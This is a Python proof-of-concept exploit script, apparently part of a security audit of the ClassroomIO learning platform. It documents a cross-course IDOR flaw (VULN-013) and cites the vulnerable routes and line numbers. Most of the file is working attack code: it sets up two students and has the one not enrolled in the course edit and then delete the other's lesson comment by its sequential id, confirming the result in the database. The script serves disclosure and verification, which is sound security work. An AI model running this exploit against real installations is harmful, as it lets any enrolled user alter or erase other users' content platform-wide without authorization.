#!/usr/bin/env python3
"""
VULN-013 (AC-3) — Lesson-comment edit/delete IDOR via a SEQUENTIAL integer id, cross-course.

Vulnerable code (targets/classroomio/):
  * routes:  apps/api/src/routes/course/lesson.ts:222-255 (PUT/DELETE /course/:courseId/lesson/comment/:commentId)
  * service: packages/core/src/services/lesson/lesson.ts:334-383 (update/deleteLessonCommentService)
  * guard:   packages/core/src/services/lesson/lesson.ts:235-248 (assertLessonCommentsEnabledForComment — flags only)
  * id col:  packages/db/src/schema.ts:543-553 (lesson_comment.id bigint identity, startWith 1)

Class: CWE-639 IDOR / broken object-level authorization over an enumerable integer key.

The flaw: PUT/DELETE lesson-comment are gated only by courseMemberMiddleware on the URL `:courseId`
(any member of THAT course). The services take the bare `commentId`, run only a feature-flag check,
and update/delete by id — no author check and no verification that the comment's lesson belongs to
the URL's course. `lesson_comment.id` is a sequential bigint, so any member of ANY one course can
edit/delete every lesson comment platform-wide by iterating ids.

Exploitation idea: student A (member of course X) posts a lesson comment → integer id N. Student B,
a member of a DIFFERENT course Y (and NOT of X), edits then deletes comment N via
/course/Y/lesson/comment/N.

A successful run proves: a plain STUDENT edits and deletes another student's lesson comment that
lives in a course the attacker is not enrolled in — verified in the DB.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (log, banner, verdict, admin_login, make_student,  # noqa: E402
                     create_course, ORG_ID, rid, psql)

VULN = "VULN-013"
HERE = os.path.dirname(os.path.abspath(__file__))


def free_seats(profile_ids):
    """Archive org-membership for the test students THIS run created (keeps the Free-plan
    20-student seat count bounded). Only touches ids created here."""
    ids = ",".join(f"'{p}'" for p in profile_ids if p)
    if not ids:
        return
    psql(f"update organizationmember set status='ARCHIVED', status_changed_at=now() "
         f"where organization_id='{ORG_ID}' and role_id=3 and profile_id in ({ids});")
    log("INFO", f"cleanup: archived {len([p for p in profile_ids if p])} test-student seat(s) created this run")


def main():
    banner(VULN, "Lesson-comment edit/delete IDOR (sequential id, cross-course)")
    log("INFO", "routes lesson.ts:222-255 gated by courseMemberMiddleware on the URL :courseId only")
    log("INFO", "service lesson.ts:334-383 acts on the bare commentId — no author check, no course scope")

    admin = admin_login()

    # --- Course X with a lesson + student A enrolled ---
    log("SETUP", "create course X + a lesson; org 'comments' app is enabled on this instance")
    course_x = create_course(admin, title=f"X {rid('c')}")
    cx = course_x["id"]
    lesson_payload = {"title": f"Lesson {rid('l')}", "courseId": cx, "order": 1}
    rl = admin.post(f"/course/{cx}/lesson", org=True, json=lesson_payload)
    if rl.status_code not in (200, 201):
        verdict(VULN, "FAILED", f"could not create lesson: {rl.status_code} {rl.text[:200]}")
        sys.exit(1)
    lesson_id = rl.json().get("data", {}).get("id")
    log("SETUP", f"course X={cx} lesson={lesson_id}")

    student_a, info_a = make_student(admin, course_id=cx, label="studentA")
    log("SETUP", f"student A={info_a['user_id']} enrolled in X (role {info_a['role_in_org']})")

    # --- Course Y with a DIFFERENT student B (not a member of X) ---
    student_b, info_b = make_student(admin, label="studentB")   # fresh course Y
    cy = info_b["course_id"]
    log("SETUP", f"student B={info_b['user_id']} enrolled in Y={cy} (role {info_b['role_in_org']}), NOT in X")

    # Confirm B is genuinely not a member of course X (ground truth via DB).
    b_in_x = psql(
        "select count(*) from groupmember gm "
        "join \"group\" g on gm.group_id=g.id "
        f"join course c on c.group_id=g.id where c.id='{cx}' and gm.profile_id='{info_b['user_id']}';")
    log("INFO", f"DB: student B membership rows in course X = {b_in_x} (expect 0)")

    # --- Student A creates a lesson comment in course X ---
    a_text = f"A's original comment {rid('a')}"
    ra = student_a.post(f"/course/{cx}/lesson/{lesson_id}/comment",
                        org=True, json={"lessonId": lesson_id, "comment": a_text})
    log("STEP", f"student A: POST /course/X/lesson/{lesson_id}/comment -> HTTP {ra.status_code}")
    if ra.status_code != 201:
        verdict(VULN, "FAILED", f"A could not create comment: {ra.status_code} {ra.text[:200]}")
        sys.exit(1)
    comment_id = ra.json().get("data", {}).get("id")
    log("STEP", f"created lesson_comment id={comment_id} (sequential bigint)")

    # --- Student B edits A's comment via B's OWN course path Y ---
    b_edit = f"HACKED by student B {rid('b')}"
    re = student_b.put(f"/course/{cy}/lesson/comment/{comment_id}",
                       org=True, json={"comment": b_edit})
    log("STEP", f"student B: PUT /course/Y/lesson/comment/{comment_id} (B is not in X) -> HTTP {re.status_code}")
    db_after_edit = psql(f"select comment from lesson_comment where id={comment_id};")
    log("PROOF", f"DB lesson_comment[{comment_id}].comment after B's edit = {db_after_edit!r}")
    edit_ok = (re.status_code == 200) and (db_after_edit is not None) and (b_edit in (db_after_edit or ""))

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(f"DELETE /course/{cy}/lesson/comment/{comment_id} HTTP/1.1\n")
        f.write("Host: localhost:21527\n")
        f.write("Cookie: classroomio.session_token=<STUDENT B session — member of course Y only>\n\n")
        f.write(f"# comment {comment_id} lives in course X ({cx}); B is enrolled only in Y ({cy}).\n")

    # --- Student B deletes A's comment via path Y ---
    rd = student_b.delete(f"/course/{cy}/lesson/comment/{comment_id}", org=True)
    log("STEP", f"student B: DELETE /course/Y/lesson/comment/{comment_id} -> HTTP {rd.status_code}")
    db_after_del = psql(f"select count(*) from lesson_comment where id={comment_id};")
    log("PROOF", f"DB rows for lesson_comment id={comment_id} after B's delete = {db_after_del} (expect 0)")
    delete_ok = (rd.status_code == 200) and (db_after_del == "0")

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"PUT  /course/{cy}/lesson/comment/{comment_id} (B edits A's comment) -> HTTP {re.status_code}\n{re.text}\n\n")
        f.write(f"DB after edit: {db_after_edit!r}\n\n")
        f.write(f"DELETE /course/{cy}/lesson/comment/{comment_id} -> HTTP {rd.status_code}\n{rd.text}\n\n")
        f.write(f"DB rows after delete: {db_after_del}\n")

    free_seats([info_a["user_id"], info_b["user_id"]])

    if (b_in_x == "0") and edit_ok and delete_ok:
        log("PROOF", f"student B (course Y only) EDITED then DELETED student A's comment in course X "
                     f"by bare id {comment_id} — cross-course IDOR over a sequential key, DB-confirmed")
        verdict(VULN, "CONFIRMED", "any course member edits/deletes any lesson comment by enumerable id (no author/scope check)")
        log("OK", "exploit confirmed — cross-course lesson-comment edit + delete")
        sys.exit(0)

    verdict(VULN, "FAILED", f"b_in_x={b_in_x} edit_ok={edit_ok} delete_ok={delete_ok}")
    log("FAIL", "cross-course edit/delete did not both take effect")
    sys.exit(1)


if __name__ == "__main__":
    main()
